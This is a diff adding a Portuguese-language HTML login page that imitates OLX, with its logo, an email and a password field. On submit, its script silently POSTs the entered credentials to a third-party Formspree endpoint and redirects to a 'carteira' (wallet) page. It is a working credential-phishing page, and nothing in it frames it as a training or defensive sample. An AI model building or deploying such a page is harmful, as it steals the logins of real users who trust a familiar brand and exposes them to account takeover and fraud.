@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login OLX - Easybank Style</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f6f6f6;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background-color: white;
+      padding: 25px 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 350px;
+      text-align: center;
+    }
+
+    .login-container img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      color: #333;
+      margin-bottom: 20px;
+      font-size: 1.4em;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 1em;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #f48024;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: bold;
+      font-size: 1em;
+      cursor: pointer;
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #e06b1e;
+      box-shadow: 0 4px 10px rgba(224, 107, 30, 0.4);
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 10px;
+      }
+      .login-container {
+        padding: 20px 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <img src="img/logo-olx.png" alt="OLX Logo">
+    <h2>Acesse a sua conta</h2>
+
+    <form id="loginForm">
+      <input type="email" name="E-mail" placeholder="Seu e-mail" required>
+      <input type="password" name="Senha" placeholder="Sua senha" required>
+
+      <button type="submit">Continuar</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+
+      try {
+        await fetch('https://formspree.io/f/mpwrjzzv', {
+          method: 'POST',
+          body: formData,
+          headers: { 'Accept': 'application/json' }
+        });
+
+        // Redirecionar direto para a carteira
+        window.location.href = 'carteira.html';
+
+      } catch (error) {
+        alert('Erro ao enviar login. Tente novamente.');
+      }
+    });
+  </script>
+
+</body>
+</html>
